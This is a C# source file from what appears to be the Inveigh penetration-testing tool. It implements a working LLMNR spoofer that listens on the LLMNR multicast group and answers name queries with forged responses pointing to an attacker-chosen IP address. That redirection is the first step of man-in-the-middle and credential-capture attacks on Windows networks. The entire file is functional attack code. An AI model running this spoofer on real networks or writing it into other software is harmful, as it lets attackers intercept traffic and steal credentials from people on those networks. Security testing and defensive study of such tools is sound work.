using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class LLMNR
    {

        public static void LLMNRListener(string IP, string spooferIP, string llmnrTTL)
        {
            byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
            byte[] ttlLLMNR = BitConverter.GetBytes(Int32.Parse(llmnrTTL));
            Array.Reverse(ttlLLMNR);
            IPEndPoint llmnrEndpoint = new IPEndPoint(IPAddress.Any, 5355);
            UdpClient llmnrClient = new UdpClient();

            try
            {
                llmnrClient.ExclusiveAddressUse = false;
                llmnrClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                llmnrClient.Client.Bind(llmnrEndpoint);
                llmnrClient.JoinMulticastGroup(IPAddress.Parse("224.0.0.252"));
            }
            catch
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[-] Error starting unprivileged LLMNR spoofer, UDP port sharing does not work on all versions of Windows.", DateTime.Now.ToString("s")));
                }

                throw;
            }

            while (!Program.exitInveigh)
            {

                try
                {                
                    byte[] udpPayload = llmnrClient.Receive(ref llmnrEndpoint);
                    byte[] llmnrType = new byte[2];
                    System.Buffer.BlockCopy(udpPayload, (udpPayload.Length - 4), llmnrType, 0, 2);
                    int llmnrSourcePort = llmnrEndpoint.Port;

                    if (BitConverter.ToString(llmnrType) != "00-1C")
                    {
                        string llmnrResponseMessage = "";       
                        byte[] llmnrTransactionID = new byte[2];
                        System.Buffer.BlockCopy(udpPayload, 0, llmnrTransactionID, 0, 2);
                        byte[] llmnrRequest = new byte[udpPayload.Length - 18];
                        byte[] llmnrRequestLength = new byte[1];
                        System.Buffer.BlockCopy(udpPayload, 12, llmnrRequestLength, 0, 1);
                        System.Buffer.BlockCopy(udpPayload, 13, llmnrRequest, 0, llmnrRequest.Length);
                        string llmnrRequestHost = Util.ParseNameQuery(12, udpPayload);
                        IPAddress sourceIPAddress = llmnrEndpoint.Address;
                        llmnrResponseMessage = Util.CheckRequest(llmnrRequestHost, sourceIPAddress.ToString(), IP.ToString(), "LLMNR");

                        if (Program.enabledLLMNR && String.Equals(llmnrResponseMessage, "response sent"))
                        {

                            using (MemoryStream ms = new MemoryStream())
                            {
                                ms.Write(llmnrTransactionID, 0, llmnrTransactionID.Length);
                                ms.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                                ms.Write(llmnrRequestLength, 0, 1);
                                ms.Write(llmnrRequest, 0, llmnrRequest.Length);
                                ms.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
                                ms.Write(llmnrRequestLength, 0, 1);
                                ms.Write(llmnrRequest, 0, llmnrRequest.Length);
                                ms.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
                                ms.Write(ttlLLMNR, 0, 4);
                                ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                                ms.Write(spooferIPData, 0, spooferIPData.Length);
                                IPEndPoint llmnrDestinationEndPoint = new IPEndPoint(sourceIPAddress, llmnrSourcePort);
                                llmnrClient.Connect(llmnrDestinationEndPoint);
                                llmnrClient.Send(ms.ToArray(), ms.ToArray().Length);
                                llmnrClient.Close();
                                llmnrEndpoint = new IPEndPoint(IPAddress.Any, 5355);
                                llmnrClient = new UdpClient();
                                llmnrClient.ExclusiveAddressUse = false;
                                llmnrClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                                llmnrClient.Client.Bind(llmnrEndpoint);
                                llmnrClient.JoinMulticastGroup(IPAddress.Parse("224.0.0.252"));
                            }

                        }

                        lock (Program.outputList)
                        {
                            Program.outputList.Add(String.Format("[+] [{0}] LLMNR request for {1} received from {2} [{3}]", DateTime.Now.ToString("s"), llmnrRequestHost, sourceIPAddress, llmnrResponseMessage));
                        }


                    }

                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] LLMNR spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

    }
}
